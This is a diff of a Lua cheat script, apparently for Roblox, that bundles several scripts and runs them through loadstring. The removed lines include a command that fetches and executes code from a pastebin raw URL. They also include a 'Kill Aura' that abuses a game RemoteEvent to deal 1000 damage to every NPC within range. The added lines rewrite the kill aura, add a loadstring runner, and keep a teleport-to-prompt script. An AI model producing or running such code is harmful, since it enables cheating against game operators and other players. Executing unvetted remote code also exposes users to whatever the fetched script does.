@@ -1,168 +1,62 @@
 local script1 = [[
-loadstring(game:HttpGet("https://pastebin.com/raw/TV83kUPv", true))()
-]]
-
-local script2 = [[
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
-local LocalPlayer = Players.LocalPlayer
-
---========================================================
--- KILL AURA CONFIG
---========================================================
-
-local KILL_AURA_ENABLED = true
 local RANGE = 250
 local DAMAGE = 1000
 local INTERVAL = 0.2
 
---========================================================
--- FIND REMOTE
---========================================================
-
-local remoteEvent
-
-local function getRemote()
-    if remoteEvent and remoteEvent.Parent then
-        return remoteEvent
-    end
-
-    local flowClient = ReplicatedStorage:FindFirstChild("FlowClient")
-
-    if flowClient then
-        local clientRunner = flowClient:FindFirstChild("ClientRunner")
-
-        if clientRunner then
-            local event = clientRunner:FindFirstChild("Event")
-
-            if event and (
-                event:IsA("RemoteEvent")
-                or event:IsA("UnreliableRemoteEvent")
-            ) then
-                remoteEvent = event
-                return remoteEvent
-            end
-        end
-    end
-
-    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-        if obj.Name == "Event"
-            and (
-                obj:IsA("RemoteEvent")
-                or obj:IsA("UnreliableRemoteEvent")
-            ) then
-
-            remoteEvent = obj
-            return remoteEvent
-        end
-    end
-
-    return nil
-end
-
---========================================================
--- CHARACTER ROOT
---========================================================
-
 local function getRoot(character)
-    if not character then
-        return nil
-    end
-
-    return character:FindFirstChild("HumanoidRootPart")
-        or character:FindFirstChild("Torso")
-        or character.PrimaryPart
+	return character and character:FindFirstChild("HumanoidRootPart")
 end
 
---========================================================
--- DAMAGE NPCS
---========================================================
+local function damageNearbyNPCs(player)
+	local character = player.Character
+	local root = getRoot(character)
 
-local function executeKillAura()
+	if not root then
+		return
+	end
 
-    if not KILL_AURA_ENABLED then
-        return
-    end
+	local npcFolder = workspace:FindFirstChild("NPCs")
+	if not npcFolder then
+		return
+	end
 
-    local character = LocalPlayer.Character
-    local root = getRoot(character)
+	for _, npc in ipairs(npcFolder:GetChildren()) do
+		if npc:IsA("Model") then
+			local humanoid = npc:FindFirstChildOfClass("Humanoid")
+			local npcRoot =
+				npc:FindFirstChild("HumanoidRootPart")
+				or npc.PrimaryPart
 
-    if not root then
-        return
-    end
+			if humanoid
+				and npcRoot
+				and humanoid.Health > 0 then
 
-    local npcFolder = workspace:FindFirstChild("NPCs")
+				local distance =
+					(npcRoot.Position - root.Position).Magnitude
 
-    if not npcFolder then
-        return
-    end
-
-    local remote = getRemote()
-
-    if not remote then
-        warn("[Kill Aura] Damage remote not found")
-        return
-    end
-
-    local rootPosition = root.Position
-
-    for _, npc in ipairs(npcFolder:GetChildren()) do
-
-        if npc:IsA("Model") then
-
-            local humanoid = npc:FindFirstChildOfClass("Humanoid")
-
-            local npcRoot =
-                npc:FindFirstChild("HumanoidRootPart")
-                or npc.PrimaryPart
-                or npc:FindFirstChildWhichIsA("BasePart")
-
-            if humanoid
-                and npcRoot
-                and humanoid.Health > 0 then
-
-                local distance =
-                    (npcRoot.Position - rootPosition).Magnitude
-
-                if distance <= RANGE then
-
-                    pcall(function()
-                        remote:FireServer(
-                            "NPCs",
-                            "Damage",
-                            humanoid,
-                            DAMAGE
-                        )
-                    end)
-
-                end
-            end
-        end
-    end
+				if distance <= RANGE then
+					humanoid:TakeDamage(DAMAGE)
+				end
+			end
+		end
+	end
 end
-
---========================================================
--- AUTOMATIC LOOP
---========================================================
 
 task.spawn(function()
+	while true do
+		for _, player in ipairs(Players:GetPlayers()) do
+			damageNearbyNPCs(player)
+		end
 
-    print("[Kill Aura] Enabled")
-    print("[Kill Aura] Range:", RANGE)
-    print("[Kill Aura] Damage:", DAMAGE)
-
-    while KILL_AURA_ENABLED do
-        executeKillAura()
-        task.wait(INTERVAL)
-    end
-
+		task.wait(INTERVAL)
+	end
 end)
-
-print("[Kill Aura] Loaded")
 ]]
 
-local script3 = [[
+local script2 = [[
 local Players = game:GetService("Players")
 
 local player = Players.LocalPlayer
@@ -258,13 +152,28 @@ root.AssemblyAngularVelocity = Vector3.zero
 
 print("Step 3: Teleported to Activate prompt")
 print("Activate position:", targetPosition)
-  
---========================================================
--- START EVERYTHING
---========================================================
+]]
+
+local function run(code, name)
+    local fn, err = loadstring(code)
+
+    if not fn then
+        warn("Failed to load " .. name .. ": " .. tostring(err))
+        return false
+    end
+
+    local success, result = pcall(fn)
+
+    if not success then
+        warn("Failed to run " .. name .. ": " .. tostring(result))
+        return false
+    end
+
+    print(name .. " finished")
+    return true
+end
 
 run(script1, "Script 1")
 run(script2, "Script 2")
-run(script3, "Script 3")
 
 print("All scripts finished")
